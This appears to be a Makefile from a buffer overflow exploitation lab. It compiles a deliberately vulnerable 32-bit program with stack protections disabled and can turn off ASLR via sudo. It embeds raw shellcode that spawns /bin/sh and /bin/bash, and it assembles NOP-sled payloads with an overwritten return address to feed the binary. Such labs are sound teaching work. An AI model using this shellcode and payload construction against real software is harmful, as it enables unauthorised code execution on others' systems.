SHELL := /bin/bash
CC = gcc -std=c99 -m32
FLAGS = -fno-pie -no-pie -z execstack -fno-stack-protector -g
FLAGS_WITH_NX = -fno-pie -no-pie -fno-stack-protector -g
DNI = 2086546955761158
ASM ?= shellcodes/bash_shellcode.s
EXE ?= vuln1
TEST ?= test

# Shellcode to execute /bin/ls
ls_SHELLCODE = \x31\xc0\x50\x68\x6e\x2f\x6c\x73\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
# Shellcode to execute /bin/sh
sh_SHELLCODE = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
# Shellcode to execute /bin/
bash_SHELLCODE = \x31\xc0\x50\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

SHELLCODE = \x00

# Shellcode length (in bytes)
SHELLCODE_LEN = $(shell echo "$(SHELLCODE)" | grep -o '\\x[0-9a-fA-F]\{2\}' | wc -l)

# Compute offset (RETADDR - EIP)
# (gdb) info frame
# Saved registers:
#  ebp at 0xffffcec8, eip at 0xffffcecc
# (gdb) p &buffer 
# $1 = (char (*)[82]) 0xffffce6e
# 0xffffcecc - 0xffffce6e = 5E = 94
OFFSET = 94

# PADDING = OFFSET - SHELLCODE_LEN
PADDING_LEN = $(shell echo $$(( $(OFFSET) - $(SHELLCODE_LEN) )))

# Generate padding (NOP sled)
PADDING = $(shell for i in $$(seq 1 $(PADDING_LEN)); do printf '\\x90'; done)

# Address to overwrite return address with -> ltrace ./vuln_nx
RET ?= ffffcede
RET_BYTES = $(shell \
  printf "%08x\n" 0x$(RET) | \
  sed 's/../& /g' | \
  awk '{for (i=NF; i>0; i--) printf "\\\x%s", $$i}')

# Final payload
PAYLOAD = $(SHELLCODE)$(PADDING)$(RET_BYTES)

PAYLOAD_FILE = payload

# Template for each config
define CONFIG_template
$(1): SHELLCODE := $$($(1)_SHELLCODE)
$(1): PAYLOAD_FILE := payloads/payload_$(1)
$(1): payload
endef

# Declare each config target
$(eval $(call CONFIG_template,ls))
$(eval $(call CONFIG_template,sh))
$(eval $(call CONFIG_template,bash))

all: payload

test:
	$(CC) $(FLAGS) -o $(TEST) $(TEST).c
	./$(TEST) 

vuln1_nx:
	$(CC) $(FLAGS) -DDNI=$(DNI) -o $(EXE) vuln1.c

vuln1:
	$(CC) $(FLAGS_WITH_NX) -DDNI=$(DNI) -o $(EXE) vuln1.c

deactivate:
	echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

activate:
	echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

read:
	readelf -W -l $(EXE) | grep GNU_STACK

bin:
	as --32 $(ASM) -o shellcodes/shellcode.o
	ld -m elf_i386 shellcodes/shellcode.o -o shellcodes/shellcode
	objdump -d shellcodes/shellcode

exe:
	cat payload | ./$(EXE)

exe_term:
	(cat payload; cat) | ./$(EXE)
	
payload:
	echo -en "$(PAYLOAD)" > $(PAYLOAD_FILE)
	@printf "Generated $(PAYLOAD_FILE) with:\n	$(SHELLCODE_LEN) bytes of shellcode\n	$(PADDING_LEN) bytes of padding\n	EIP address to overwrite: $(RET_BYTES)\n"
	@hexdump -C $(PAYLOAD_FILE)

clean:
	rm -f payload_bash

